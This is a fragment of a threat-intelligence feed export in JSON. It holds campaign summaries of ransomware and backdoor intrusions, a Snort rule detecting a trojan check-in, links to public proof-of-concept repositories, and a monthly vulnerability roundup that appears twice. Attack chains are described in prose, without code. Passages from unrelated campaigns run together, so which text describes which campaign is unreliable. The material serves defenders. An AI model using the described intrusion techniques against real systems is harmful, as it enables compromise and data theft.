Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"1435ca1c-6910-473c-b608-d85fc8a9847f","type":"snort","category":"Network activity","value":"alert tcp-pkt $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE Win32/Darkme Trojan Checkin M1\"; flow:established,to_server; content:\"92|a9 a9 a9|\"; startswith; fast_pattern; pcre:\"/^[A-Z]{2}/R\"; content:\"|a9|\"; distance:0; reference:url,blog.nsfocus.net/darkcasino-apt-evilnum; classtype:trojan-activity; sid:2036835; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_and_Server, created_at 2022_06_03, deployment Perimeter, former_category MALWARE, malware_family Darkme, performance_impact Low, signature_severity Major, updated_at 2022_06_03;)","comment":"ET MALWARE Win32/Darkme Trojan Checkin M1","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"fcc01322-2ba0-47dc-a66b-235018d453f3","name":"WinRAR Zero-Day Vulnerability Exploited To Drop Malware (CVE-2023-38831)","description":"Users on trading forums are being targeted with malicious ZIP archives to drop malware including DarkMe, GuLoader, and Remcos RAT.

This campaign, which peaked in mid-2023, has remained largely unnoticed for over a year. The targets include government, military, telecommunications, IT service providers, financial organizations, and NGOs. Scarred Manticore has a history of targeting high-value organizations with various backdoors on Windows servers, and in this latest campaign, they leveraged the sophisticated LionTail framework to create custom, undetectable implants for each compromised server. This evolution in their techniques and capabilities demonstrates the progress Iranian actors have made in recent years.\r\n\r\nLionTail is a malware framework with custom shellcode loaders and memory resident shellcode payloads. It includes the LionTail backdoor, a lightweight but sophisticated tool written in C, designed to be installed on Windows servers. This backdoor allows attackers to remotely execute commands through HTTP requests, setting up listeners for specific URLs provided in its configuration.

The infection process is carried out using the publicly available Impacket tool.\r\n\r\n\r\nThe United States Cybersecurity and Infrastructure Security Agency (CISA) recommends the following steps:\r\n\r\nReduce the likelihood of a damaging cyber intrusion:\r\n\r\nValidate that all remote access to the organization’s network and privileged or administrative access requires multi-factor authentication.\r\nEnsure that software is up to date, prioritizing updates that address known exploited vulnerabilities identified by CISA.\r\nConfirm that the organization’s IT personnel have disabled all ports and protocols that are not essential for business purposes.\r\nIf the organization is using cloud services, ensure that IT personnel have reviewed and implemented strong controls outlined in CISA's guidance.\r\nSign up for CISA's free cyber hygiene services, including vulnerability scanning, to help reduce exposure to threats.\r\n\r\n\r\nTake steps to quickly detect a potential intrusion:\r\n\r\nEnsure that cybersecurity/IT personnel are focused on identifying and quickly assessing any unexpected or unusual network behavior. Enable logging in order to better investigate issues or events.\r\nConfirm that the organization's entire network is protected by antivirus/antimalware software and that signatures in these tools are updated.\r\nIf working with Ukrainian organizations, take extra care to monitor, inspect, and isolate traffic from those organizations; closely review access controls for that traffic. \r\n\r\nEnsure that the organization is prepared to respond if an intrusion occurs:\r\n\r\nDesignate a crisis-response team with main points of contact for a suspected cybersecurity incident and roles/responsibilities within the organization, including technology, communications, legal and business continuity.\r\nAssure availability of key personnel; identify means to provide surge support for responding to an incident.\r\nConduct a tabletop exercise to ensure that all participants understand their roles during an incident.\r\n\r\n\r\nMaximize the organization's resilience to a destructive cyber incident:\r\n\r\nTest backup procedures to ensure that critical data can be rapidly restored if the organization is impacted by ransomware or a destructive cyberattack; ensure that backups are isolated from network connections.\r\nIf using industrial control systems or operational technology, conduct a test of manual controls to ensure that critical functions remain operable if the organization’s network is unavailable or untrusted.\r\n\r\n\r\nMcAfee’s ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

This malware was found on compromised computers within the organization. MataDoor was designed to be stealthy, with executable file names similar to legitimate software and valid digital signatures. It also employed the Themida protector to evade detection.\r\n\r\nAnalysis of MataDoor revealed it to be a sophisticated modular backdoor. It is believed that the malware was introduced into the system through a phishing email that contained a DOCX document. This document exploited the CVE-2021-40444 vulnerability, suggesting that it was the initial entry point for the backdoor.\r\n\r\nMataDoor operates as a DLL and exports both the DllMain and DllRegisterServer functions. This allows the malware to run when invoked through the standard Windows Regsvr32 program. Essentially, these functions serve the same purpose, initializing the backdoor and executing its main logic in a separate thread.\r\n\r\nIn all known cases, MataDoor relies on a loader service to run, which automatically starts with the system, ensuring the backdoor's persistence. This loader service simply launches the backdoor DLL, and its configuration, like that of the backdoor, is encrypted using the AES algorithm in cipher feedback (CFB) mode.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key.

The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.\r\n\r\nThe Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer. The threat actors then began port scanning for SMB and a few backup systems such as Synology, Veeam, and Backup Exec.\r\n\r\nNext, a battery of Windows utilities were ran to check the Windows domain trusts, domain administrators, domain controllers, and test connectivity. They then checked access to remote systems by connecting to the C$ share.\r\n\r\nThe threat actors proceeded to move laterally to multiple other servers on the network by making use of existing local administrative rights of a compromised user. Cobalt Strike beacons were deployed to each server to facilitate remote access. Furthermore, the threat actors dropped an obfuscated PowerShell script on one of the machines to further their access. The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.\r\n\r\nNext, the threat actors used a custom implementation of the Zerologon (CVE-2020-1472) exploit (zero.exe) against one of the domain controllers. The domain controllers were vulnerable, and as a result, the operators managed to dump the domain administrator’s NTLM hash. The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.\r\n\r\nThe threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike. Once on these systems, additional scanning occurred using a binary called check.exe that ran ICMP sweeps across the network.\r\n\r\nMcAfee’s ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

These attacks have been almost solely conducted against French victims in several sectors such as manufacturing, technology, construction, and business services.\r\n\r\nTinyNuke is a banking trojan that has been around since 2017 targeting French victims. It has quite a large resemblance to another notorious banking trojan known as Zeus, which in turn has many variants with similar features. TinyNuke can also be used to steal credentials and other sensitive information from the victim as well allows for further infection with malware. The author of TinyNuke had initially released the code on GitHub, and although the repository has been taken down it enabled the spread of its code to be reshared openly.\r\n\r\nSince 2017, TinyNuke, has been used for relatively small campaigns each year, being in 2017 it was used as the second stage of attacks carried out using Zeus rather than as the main malware. Throughout 2018, 2019 and 2020 TinyNuke started being used as a first-stage malware, although very few campaigns happened in 2019 and 2020. In 2021, Proofpoint managed to identify several campaigns throughout the year, each reaching around 2500 emails in one go, which impacted hundreds of its customers. These attacks totaled three times more campaigns and messages than the two preceding years.\r\n\r\nMcAfee’s ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

A user executed this JavaScript, which triggered a PowerShell script to install NetSupport and establish persistence in the system's registry. After five days, the threat actor conducted reconnaissance and tried to reactivate a disabled domain admin account. They also installed an OpenSSH server for persistence and established a reverse SSH tunnel to their server on a VPS.\r\n\r\nUsing the tunnel, they connected to the domain controller, used Impacket tools for discovery, and changed firewall settings on a remote server. They furthered lateral movement using Impackets wmiexec.py, deploying NetSupport malware to remote hosts. They scheduled tasks for persistence and issued discovery commands.\r\n\r\nThe next day, they deployed NetSupport on a domain controller and dumped the NTDS.dit database, likely exfiltrating it. They repeated this on another domain controller, ran an Active Directory auditing tool, and added a new account with admin privileges. They accessed the server via RDP and proceeded to disable Microsoft Defender, dump LSASS, and extract Windows event logs. Sensitive documents were accessed, and cleanup tasks were performed.\r\n\r\nThe final actions involved dropping Nim binaries to create a backdoor user, but this attempt failed.

Some affiliates prefer mass-spread attacks using phishing campaigns and exploit kits, where other affiliates adopt a more targeted approach by brute-forcing RDP access or through exploiting public facing applications.

Throughout their investigation, they uncovered over a dozen of attacked organizations. The analysis of information gathered during the investigation shows evidence of the goal of the attackers being cyberespionage. The attackers used carefully crafted phishing emails, with private information, which indicates they have done preparatory work beforehand or have used information gathered from previous attacks.\r\n\r\nMalicious files attached to the email exploit the CVE-2017-11882 vulnerability once executed. The analysis uncovered the attackers used has many as 6 backdoors for redundancy. They have made extensive use of DLL Hijacking techniques, which allowed them to prevent security software to detect the malware deployed.\r\n\r\nThe analysis of the attacks found that the malware deployed contacted C2s previously used by a Chinese APT group named TA428. This suggests that the attacks might have been carried out by the Chinese APT.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Together with other threat data, we found a correlation between TigerRAT and NukeSped, another North Korean actor tool. Although there seems to be some close code relationship, triggering the same detection rules, there has not been enough evidence of the two being the same tool but with different names.

For those in the audience unfamiliar with our shtick, we compile a shortlist of the top vulnerabilities every month. For this month, and in light of Valentine's Day, I humbly offer this short poem for our readers:\r\n\r\nRoses are red,\r\nviolets are blue,\r\nRansomware gangs,\r\ntargeting you.\r\n\r\nEven with love and RCE payloads in the air, we've managed to survive the month of February without an industry-wide meltdown. However, some impactful vulnerabilities have been released and identified as being used in the wild. So, without further ado, sit back, grab your leftover conversation hearts, and let's dive into the following CVEs:\r\n\r\nCVE-2021-21974 – VMware ESXi\r\nCVE-2022-39952 – Fortinet FortiNAC\r\nCVE-2023-25136 – OpenSSH\r\nCVE-2023-23530 + CVE-2023-23531 – Apple macOS and iOS\r\nCVE-2021-21974: You still haven't patched your ESXi box?\r\n\r\n\r\nWhat is it?\r\n\r\nYou read that correctly; this is a CVE from 2021 that has been exploited extensively in the wild these past few weeks. The latest ransomware surge has resurrected this CVE, returning it to the top 10 this month. This particular issue is a heap overflow in VMware ESXi's OpenSLP (Service Location Protocol) service, a way that devices can share what services they host and discover others. Successful exploitation allows for arbitrary code execution.\r\n\r\n\r\nWho cares?\r\n\r\nAs mentioned, this older CVE has been resurrected by ransomware gangs actively exploiting it. Consider yourself vulnerable if your organization runs an ESXi server that hasn't been updated since February 2021. Figure 2, courtesy of VMware's February 2021 security advisory, lists the specific versions that address the issue for ESXi server 6.5, 6.7, and 7.0.\r\n\r\nAt the same time, this issue is around two years old, and a surprising number of vulnerable ESXi instances are exposed to the internet. To investigate how many lazy sysadmins are out there, we ran a simple Shodan scan looking for ESXi servers still running the vulnerable versions. According to our search, we discovered over 48,000 servers, as seen in Figure 3.\r\n\r\nIt is worth noting that this number is inflated by the fact that we did not verify how many of the 48k vulnerable instances also had the SLP port exposed. However, we have identified thousands of positive detections across the globe.\r\n\r\n@ACEResponder has compiled a simple-to-follow series of questions to determine if your ESXi server has been compromised.\r\n\r\nThere is also publicly available POC code online, which I suspect is the basis for many of these ransomware gangs exploiting this vulnerability.\r\n\r\n\r\nWhat can I do?\r\n\r\nAs you may have guessed, a patch is available, along with workarounds for those who cannot patch. If you can't patch right this second, we're happy to inform you that mitigation is as simple as disabling the SLP daemon; instructions for accomplishing this can be found here. Of course, Trellix has you covered with relevant signatures (for both the vulnerability and the ransomware being deployed) across our various products, from Endpoint Security to Network Security to Helix; more information can be found here.\r\n\r\nPrior to ESXi 7.0 U2c, the SLP daemon is enabled and listening on port 427 by default. Thus, it is recommended, even with the official patch, to disable this daemon if you haven't already. On the subject of mitigations, this is also an excellent time to mention that it is essential to have offsite backups, even for VMs. ESXi allows for taking snapshots and exporting VMs, which should be done regularly for critical systems.\r\n\r\nCVE-2022-39952: Fingers crossed that zip only contains an appliance key\r\n\r\n\r\nWhat is it?\r\n\r\nCVE-2022-39952—publicly released on February 16th, 2023—allows for arbitrary file writes with root permissions. This vulnerability affects Fortinet FortiNAC software, best described in their words: \"FortiNAC is a zero-trust access solution that oversees and protects all digital assets connected to the enterprise network, covering devices from IT, IoT, OT/ICS to IoMT.\" However, there seems to be a mix-up between zero-trust and zero-auth, as this vulnerability allows an unauthenticated user to have an arbitrary write anywhere on the system. The arbitrary write originates from an unprotected file upload designed for users to upload an \"appliance key\" as a zip file.\r\n\r\n\r\nWho cares?\r\n\r\nWell, we know for a fact that threat actors care about this one. Which means that if your organization uses the FortiNAC access solution, you likely have a lot of catching up to do in the caring department. We try to abstain from determining the criticality of a CVE based on CVSS alone; however, this one is a stunner with a 9.8 out of 10. This high score is primarily because it is very trivial to exploit. The unsanitized upload is processed with a script (Figure 5), which changes the directory (cd) to the root folder, allowing the extraction to write to any location. Then, the vulnerable script instructs the unzip command to overwrite any existing files without confirmation with the -o flag.\r\n\r\nWith the simplicity of the vulnerability, there are already multiple POCs available on the web, and I would expect to see many scanners looking for vulnerable versions to exploit over the internet. One indicator of compromise (IoC) to look for is the line \"Running config ApplianceXML\" in the log file \"/bsc/logs/output.master.\"\r\n\r\n\r\nWhat can I do?\r\n\r\nIt is imperative to patch the system as soon as possible. You can find all affected versions and patch information here. As no available workarounds exist at the time of this writing, patching is the only surefire remediation for this vulnerability. That being said, Trellix Network Security also has your back with detection for CVE-2022-39952 via rule \"Fortinet Fortinac CVE-2022-39952 keyUpload.jsp RCE.\" Those using Trellix IPS are also covered via signature ID 0x452c4b00.\r\n\r\n\r\nCVE-2023-25136: Good thing my organization is still running OpenSSH v0.11\r\n\r\n\r\nWhat is it?\r\n\r\nThis vulnerability was introduced in version 9.1 of OpenSSH, allowing an unauthenticated user to crash the service via a double-free bug. Currently, the exploitation attempts have only resulted in a Denial of Service (DoS); however, this bug has excellent potential, as the attacker can control the instruction pointer (IP/RIP). This also jibes with the CVSSv3 rating, which has Integrity and Confidentiality impacts both marked as High, which is not common for a simple DoS. We will be keeping a close eye on this CVE to see if anyone can make a useful exploit out of it.\r\n\r\n\r\nWho cares?\r\n\r\nThe statement \"There is no cloud, it's just someone else's computer\" could easily be changed to \"someone else's Linux computer,\" as Linux systems are still the most prevalent server operating system. The most common way for administrators to remotely manage and update Linux systems is through SSH, which makes CVE-2023-25136 a big deal.\r\n\r\nAs mentioned, SSH is a widespread way of remotely managing servers. Furthermore, OpenSSH's implementation is the most popular and the default SSH server/client installed on all major Linux distributions. I would be surprised if any organization didn't have at least one machine listening on port 22, SSH's default listening port. The good news is that many distributions of Linux don't update to the bleeding edge very often, meaning that most SSH servers deployed today are probably on older versions of OpenSSH that are unaffected by this issue. For instance, the latest long-term support (LTS) version of Ubuntu 22.04 is still on OpenSSH version 8.9p1.\r\n\r\n\r\nWhat can I do?\r\n\r\nIt is best to double-check each system with an exposed SSH port and verify it is not running OpenSSH version 9.1. If any of them are, following the recommended procedure to update your system's software should suffice, and a reboot most likely will not be needed. If you would like to get more information on this issue, OpenWall has included a ton of detail here, and if you want to see the git commit that fixed the issue, that can be found here.\r\n\r\nWhile the developers could not successfully exploit this issue, it doesn't mean that it is impossible to exploit. During the bug's reproduction, control of the RIP register was obtained, which allowed the execution to jump to any address in the OpenSSH binary’s address space. Because this vulnerability may be successfully exploited in the future, you can breathe a sigh of relief knowing that Trellix Network Security has you covered with signature “OpenSSH server 9.1 CVE-2023-25136 Double-Free Vulnerability.”\r\n\r\n\r\nCVE-2023-23530 + CVE-2023-23531: Wow, this hacker must be a genius!\r\n\r\nWhat is it?\r\n\r\nDisclaimer: While we try not to toot our own horn too much on this publication, we genuinely believe this research done by our Advanced Research Center deserves a spotlight this month.\r\n\r\nApple takes many precautions to eliminate all forms of dynamic code execution by using code signing and scripting languages like AppleScript. Austin Emmitt of our Advanced Research Center has discovered a new vulnerability class that would allow attackers to bypass these restrictions and gain dynamic code execution. CVE-2023-23530 and CVE-2023-23531 are classified as elevation of privilege (EoP) bugs that will enable an attacker to bypass security mechanisms and run arbitrary code in the context of several platform applications with varying privileges.\r\n\r\n\r\nWho cares?\r\n\r\nThis should be of concern if your organization uses Apple's *OS, meaning iOS (iPhones, iPads) or macOS (MacBooks, iMacs, Macs). These CVEs are within a new class of bugs for Apple products and have introduced a significant breach to the *OS security model. If you are an Apple security nerd, this may sound similar to what was taken advantage of in the ForcedEntry exploit utilized by Pegasus, spyware developed by the Israeli cyber-arms company NSO Group, as both our original research and the primitives used by ForcedEntry exploit the dynamic nature of NSPredicates. With our team bringing this vulnerability to light, more bugs are expected to be discovered and secured.\r\n\r\n\r\nWhat can I do?\r\n\r\nA small amount of malicious code can exploit either of these vulnerabilities. Because the base primitive of NSPredicates is not inherently hostile, an application downloaded from the App Store could be an attack vector used by bad actors. It would be wise to upgrade macOS to 13.2 and iOS to 16.3 or greater, which addresses these vulnerabilities, as soon as possible. The official Apple security advisory can be found here.","threat_level_id":2,"kb_article_link":null,"coverage":null,"updated_on":"2023-03-07T22:17:43.000Z","external_analysis":{"links":["https://www.trellix.com/en-us/about/newsroom/stories/research/the-bug-report-february-2023-edition.html","https://github.com/Shadow0ps/CVE-2021-21974","https://github.com/horizon3ai/CVE-2022-39952"]},"is_coat":0,"created_on":"2023-03-07T22:17:43.000Z"}]},{"id":"181e7af4-27cf-478e-bf6d-2f72594b9163","type":"vulnerability","category":"External analysis","value":"CVE-2021-33771","comment":"Windows Kernel Elevation of Privilege Vulnerability","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"3442fd96-81f2-427a-a9cb-23bcd371c401","name":"SOURGUM Using Zero-Day Exploits to Drop DevilsTongue Malware","description":"Multiple Microsoft Windows 0-day exploits were used to drop spyware onto the systems of unsuspecting victims.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools.

The attacks involve multi-stage chains that start with exploitation and then initiate commands to download payloads from remote servers, often via IP-literal URLs.\r\n\r\nIn the first attack chain, encoded PowerShell and certutil were used to download the payload from the server, categorized as a Metasploit stager. It involves checking the system architecture, disabling PowerShell logging, decoding and executing Base64-encoded, Gzip-compressed strings, and launching them as new processes.\r\n\r\nThe second attack chain utilized curl to download a payload executed with cl.exe, dynamically compiling it at runtime. The final payload could not be verified due to unavailable tmpfiles[.]org files, associated with Burp Suite's Collaborator product for API security testing.\r\n\r\nThe third attack chain employed various Windows executables in the server's ProgramData path, with a call to PowerShell but no scripts. Instead, commands were invoked by executables with short names.\r\n\r\nOrganizations using Progress' WS_FTP should promptly update or disable affected systems.

Macros embedded into the document files extracted and executed a malicious HTML application which downloaded the BazarLoader DLL into memory. Within the two first hour's hands-on operators had shown up to actively control the attack. These operators would then start gathering information to get a view of the infrastructure, using common tools such as Net, nltest, and shareFinder. Armed with the information the operators then deployed Cobalt Strike beacons and used Windows Management Interface Command (WMIC) for remote process creation to expand their hold within the network with persistence capabilities. Once the Cobalt Strike Beacons where installed, they exfiltrated data of interest using Rclone to a legitimate cloud service called \"MEGA cloud storage\".\r\n\r\nOn the second day the operators made use of RDP to access backup servers to check backup settings and run processes on those servers via the task manager GUI application.\r\n\r\nOn the fourth day the operators returned for another round of data exfiltration.\r\n\r\nOn the last day of the attack, the operators RDP to the devices to install and configure the AnyDesk remote desktop application and followed by trying to dump the Local Security Authority Subsystem Service (LSASS) process with Process Hacker tool. Once this was done, they deployed the Conti Ransomware from a batch script to all the domain joined systems.\r\n\r\nOne interesting fact about this attack is that at no point the attacker interacted directly with the Domain Controllers.

They trojanized these repositories by adding malicious code and strategically inserting keywords into their descriptions to boost their visibility in GitHub searches.\r\n\r\nIn the first stage of the attack, a novel technique called \"exec smuggling\" was used. This technique concealed a payload within a sequence of whitespace characters, effectively hiding malicious content. The payload was later executed using the Python built-in method exec(). Before this stage, the malware ensured the installation of necessary dependencies in Python.\r\n\r\nThe second stage involved a dropper that set up the environment. It installed several Python packages, such as requests, httpx, pyperclip, pyotp, winregistry, psutil, pycryptodomex, and asyncio. It also checked for the presence of the Cryptodome directory in all installed Python versions, possibly for compatibility reasons. Afterward, the script created a decrypt payload, saved it in a file named pl.py within the user's APPDATA directory, and executed it discreetly.\r\n\r\nThe third stage introduced a modified version of an open-source information stealer project known as BlackCap-Grabber.

For those in the audience unfamiliar with our shtick, we compile a shortlist of the top vulnerabilities every month. For this month, and in light of Valentine's Day, I humbly offer this short poem for our readers:\r\n\r\nRoses are red,\r\nviolets are blue,\r\nRansomware gangs,\r\ntargeting you.\r\n\r\nEven with love and RCE payloads in the air, we've managed to survive the month of February without an industry-wide meltdown. However, some impactful vulnerabilities have been released and identified as being used in the wild. So, without further ado, sit back, grab your leftover conversation hearts, and let's dive into the following CVEs:\r\n\r\nCVE-2021-21974 – VMware ESXi\r\nCVE-2022-39952 – Fortinet FortiNAC\r\nCVE-2023-25136 – OpenSSH\r\nCVE-2023-23530 + CVE-2023-23531 – Apple macOS and iOS\r\nCVE-2021-21974: You still haven't patched your ESXi box?\r\n\r\n\r\nWhat is it?\r\n\r\nYou read that correctly; this is a CVE from 2021 that has been exploited extensively in the wild these past few weeks. The latest ransomware surge has resurrected this CVE, returning it to the top 10 this month. This particular issue is a heap overflow in VMware ESXi's OpenSLP (Service Location Protocol) service, a way that devices can share what services they host and discover others. Successful exploitation allows for arbitrary code execution.\r\n\r\n\r\nWho cares?\r\n\r\nAs mentioned, this older CVE has been resurrected by ransomware gangs actively exploiting it. Consider yourself vulnerable if your organization runs an ESXi server that hasn't been updated since February 2021. Figure 2, courtesy of VMware's February 2021 security advisory, lists the specific versions that address the issue for ESXi server 6.5, 6.7, and 7.0.\r\n\r\nAt the same time, this issue is around two years old, and a surprising number of vulnerable ESXi instances are exposed to the internet. To investigate how many lazy sysadmins are out there, we ran a simple Shodan scan looking for ESXi servers still running the vulnerable versions. According to our search, we discovered over 48,000 servers, as seen in Figure 3.\r\n\r\nIt is worth noting that this number is inflated by the fact that we did not verify how many of the 48k vulnerable instances also had the SLP port exposed. However, we have identified thousands of positive detections across the globe.\r\n\r\n@ACEResponder has compiled a simple-to-follow series of questions to determine if your ESXi server has been compromised.\r\n\r\nThere is also publicly available POC code online, which I suspect is the basis for many of these ransomware gangs exploiting this vulnerability.\r\n\r\n\r\nWhat can I do?\r\n\r\nAs you may have guessed, a patch is available, along with workarounds for those who cannot patch. If you can't patch right this second, we're happy to inform you that mitigation is as simple as disabling the SLP daemon; instructions for accomplishing this can be found here. Of course, Trellix has you covered with relevant signatures (for both the vulnerability and the ransomware being deployed) across our various products, from Endpoint Security to Network Security to Helix; more information can be found here.\r\n\r\nPrior to ESXi 7.0 U2c, the SLP daemon is enabled and listening on port 427 by default. Thus, it is recommended, even with the official patch, to disable this daemon if you haven't already. On the subject of mitigations, this is also an excellent time to mention that it is essential to have offsite backups, even for VMs. ESXi allows for taking snapshots and exporting VMs, which should be done regularly for critical systems.\r\n\r\nCVE-2022-39952: Fingers crossed that zip only contains an appliance key\r\n\r\n\r\nWhat is it?\r\n\r\nCVE-2022-39952—publicly released on February 16th, 2023—allows for arbitrary file writes with root permissions. This vulnerability affects Fortinet FortiNAC software, best described in their words: \"FortiNAC is a zero-trust access solution that oversees and protects all digital assets connected to the enterprise network, covering devices from IT, IoT, OT/ICS to IoMT.\" However, there seems to be a mix-up between zero-trust and zero-auth, as this vulnerability allows an unauthenticated user to have an arbitrary write anywhere on the system. The arbitrary write originates from an unprotected file upload designed for users to upload an \"appliance key\" as a zip file.\r\n\r\n\r\nWho cares?\r\n\r\nWell, we know for a fact that threat actors care about this one. Which means that if your organization uses the FortiNAC access solution, you likely have a lot of catching up to do in the caring department. We try to abstain from determining the criticality of a CVE based on CVSS alone; however, this one is a stunner with a 9.8 out of 10. This high score is primarily because it is very trivial to exploit. The unsanitized upload is processed with a script (Figure 5), which changes the directory (cd) to the root folder, allowing the extraction to write to any location. Then, the vulnerable script instructs the unzip command to overwrite any existing files without confirmation with the -o flag.\r\n\r\nWith the simplicity of the vulnerability, there are already multiple POCs available on the web, and I would expect to see many scanners looking for vulnerable versions to exploit over the internet. One indicator of compromise (IoC) to look for is the line \"Running config ApplianceXML\" in the log file \"/bsc/logs/output.master.\"\r\n\r\n\r\nWhat can I do?\r\n\r\nIt is imperative to patch the system as soon as possible. You can find all affected versions and patch information here. As no available workarounds exist at the time of this writing, patching is the only surefire remediation for this vulnerability. That being said, Trellix Network Security also has your back with detection for CVE-2022-39952 via rule \"Fortinet Fortinac CVE-2022-39952 keyUpload.jsp RCE.\" Those using Trellix IPS are also covered via signature ID 0x452c4b00.\r\n\r\n\r\nCVE-2023-25136: Good thing my organization is still running OpenSSH v0.11\r\n\r\n\r\nWhat is it?\r\n\r\nThis vulnerability was introduced in version 9.1 of OpenSSH, allowing an unauthenticated user to crash the service via a double-free bug. Currently, the exploitation attempts have only resulted in a Denial of Service (DoS); however, this bug has excellent potential, as the attacker can control the instruction pointer (IP/RIP). This also jibes with the CVSSv3 rating, which has Integrity and Confidentiality impacts both marked as High, which is not common for a simple DoS. We will be keeping a close eye on this CVE to see if anyone can make a useful exploit out of it.\r\n\r\n\r\nWho cares?\r\n\r\nThe statement \"There is no cloud, it's just someone else's computer\" could easily be changed to \"someone else's Linux computer,\" as Linux systems are still the most prevalent server operating system. The most common way for administrators to remotely manage and update Linux systems is through SSH, which makes CVE-2023-25136 a big deal.\r\n\r\nAs mentioned, SSH is a widespread way of remotely managing servers. Furthermore, OpenSSH's implementation is the most popular and the default SSH server/client installed on all major Linux distributions. I would be surprised if any organization didn't have at least one machine listening on port 22, SSH's default listening port. The good news is that many distributions of Linux don't update to the bleeding edge very often, meaning that most SSH servers deployed today are probably on older versions of OpenSSH that are unaffected by this issue. For instance, the latest long-term support (LTS) version of Ubuntu 22.04 is still on OpenSSH version 8.9p1.\r\n\r\n\r\nWhat can I do?\r\n\r\nIt is best to double-check each system with an exposed SSH port and verify it is not running OpenSSH version 9.1. If any of them are, following the recommended procedure to update your system's software should suffice, and a reboot most likely will not be needed. If you would like to get more information on this issue, OpenWall has included a ton of detail here, and if you want to see the git commit that fixed the issue, that can be found here.\r\n\r\nWhile the developers could not successfully exploit this issue, it doesn't mean that it is impossible to exploit. During the bug's reproduction, control of the RIP register was obtained, which allowed the execution to jump 